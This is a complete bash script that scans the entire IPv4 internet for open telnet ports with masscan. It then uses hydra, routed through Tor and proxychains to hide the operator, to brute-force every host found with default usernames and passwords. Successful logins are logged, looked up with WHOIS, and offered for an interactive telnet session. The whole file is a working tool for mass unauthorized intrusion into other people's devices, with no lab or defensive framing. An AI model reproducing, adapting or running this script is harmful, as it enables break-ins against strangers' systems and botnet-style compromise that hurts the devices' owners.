#!/bin/bash
##
### discovery.sh - Discover random telnet hosts with masscan and use hydra to check for default credentials 
##	  NOTE: Run as './discovery.sh 2>/dev/null' to suppress bash warnings, uses clearnet for masscan and tor for hydra.
#
export defaults=(admin password default root)

if [ $(whoami) != "root" ]; then
	echo "[!] Login as root and try again."
	exit
elif [ -z $(which masscan) ]; then
	echo "[!] Masscan not found. Install and try again."
	exit
elif [ -z $(which hydra) ]; then
	echo "[!] Hydra not found. Install and try again."
	exit
elif [ -z $(which tor) ]; then
	echo "[!] Tor not found. Install and try again."
	exit
elif [ -z $(which proxychains) ]; then
	echo "[!] Proxychains not found. Install and try again."
	exit
elif [ -z "$1" ]; then
	echo "[+] $0 <scan delay>"
	exit
elif [ -z $(ss -4tlpn | grep 'tor') ]; then
	echo "[+] Starting tor service.."
	service tor start
fi

cleanup() {
	pkill masscan
	pkill hydra
	pkill tail
	rm -f hydra.restore defaults.txt hosts.txt discovery.txt logins.txt
	exit
}

trap cleanup SIGINT

echo "[+] Scanning for random telnet hosts($1 seconds).."
masscan -p23 0.0.0.0/0 --exclude 255.255.255.255 --rate=3000 >> hosts.txt &
tail -f hosts.txt &
sleep $1
pkill tail
pkill masscan

for item in ${defaults[*]}; do
	echo $item >> defaults.txt
done

echo "[+] Running hydra on $(cat hosts.txt | wc -l) hosts.."

for host in $(cat hosts.txt | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'); do
	proxychains 2>/dev/null hydra -L defaults.txt -P defaults.txt -o discovery.txt telnet://$host > /dev/null &
done

echo "[+] Waiting for background jobs to complete($1 seconds).."
echo "[+] Potential login(s) found:"
tail -f discovery.txt | grep login &
sleep $1
pkill tail
pkill hydra
cat discovery.txt | grep login > logins.txt
rm -f hosts.txt defaults.txt discovery.txt hydra.restore
echo "[+] Restarting tor service.."
service tor stop; service tor start

for ip in $(cat logins.txt | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u); do
	echo -e "\n\n[+] WHOIS $ip -> $(tor-resolve -x $ip)"
	whois $ip | grep -E 'ame|escr|ountry|tate|ange'
	echo -e "\n[+] Potential login(s) for $ip:"
	cat logins.txt | grep $ip | head -n 3 
	read -p "[!] Do you want to telnet to $ip[y/n]?" answer 2>&1

	if [ "$answer" == "y" ] || [ "$answer" == "Y" ]; then
		proxychains 2>&1 telnet $ip
	else
		continue
	fi
done

echo "[!] $0 complete. See 'logins.txt' for more info."
